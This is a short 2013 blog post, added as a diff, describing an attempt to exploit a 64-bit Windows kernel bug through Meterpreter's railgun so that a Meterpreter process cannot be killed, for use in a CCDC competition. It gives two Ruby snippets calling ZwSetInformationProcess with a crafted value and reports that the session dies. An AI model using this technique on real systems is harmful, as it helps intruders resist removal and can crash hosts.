@@ -1,0 +1,59 @@
+---
+layout: post
+title: "Unkillable Processes"
+date: 2013-08-10 10:39
+comments: true
+categories:
+- railgun
+- x64
+- incomplete
+---
+
+Saw this post about a kernel bug in 64 bit Windows that is a DoS, it can also create an unkillable process:
+Blog post: http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html
+
+Figured I'd take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.
+
+Started with the C code for the bug: http://pastebin.com/QejGQXib along with the only resource I could find about the actual function: http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a
+
+I came up with this:  
+
+```ruby
+client.railgun.add_function('ntdll','ZwSetInformationProcess','DWORD',[
+   ["DWORD","ProcessHandle","in"],
+   ["DWORD","ProcessInformationClass","in"],
+   ["DWORD","ProcessInformation","inout"],
+   ["DWORD","ProcessInformationLength","in"],
+])
+processinfo = 0x8000F129
+tproc = client.sys.process.open
+tmem = tproc.memory.allocate(4)
+tproc.memory.write(tmem,processinfo)
+cpidhandle = client.railgun.kernel32.GetCurrentProcess()['return']
+client.railgun.ntdll.ZwSetInformationProcess(cpidhandle,0x21,tmem,0x4)
+```
+
+ScriptJunkie quickly identified that I was using a DWORD for a Handle and using 4 bits for a 64 bit process (should be 8) as well as the fact that I could use a PDWORD with the ProcessInformation inout parameter instead of writing it to memory myself.
+
+
+The result:
+```ruby
+client.railgun.add_function('ntdll','ZwSetInformationProcess','DWORD',[
+     ["HANDLE","ProcessHandle","in"],
+     ["DWORD","ProcessInformationClass","in"],
+     ["PDWORD","ProcessInformation","inout"],
+     ["DWORD","ProcessInformationLength","in"],
+])
+processinfo = 0x8000F129
+cpidhandle = client.railgun.kernel32.GetCurrentProcess()['return']
+client.railgun.ntdll.ZwSetInformationProcess(cpidhandle,0x21,processinfo,0x4)
+```
+
+Which results in a process that you can't kill, but the process is also non-functioning as far as I can tell because the Meterpreter session dies. 
+
+
+I'm curious if with some tweaking I can get it to act much like the KillMe.exe 
+https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe
+
+
+Which continues to operate just fine after the modification happens.
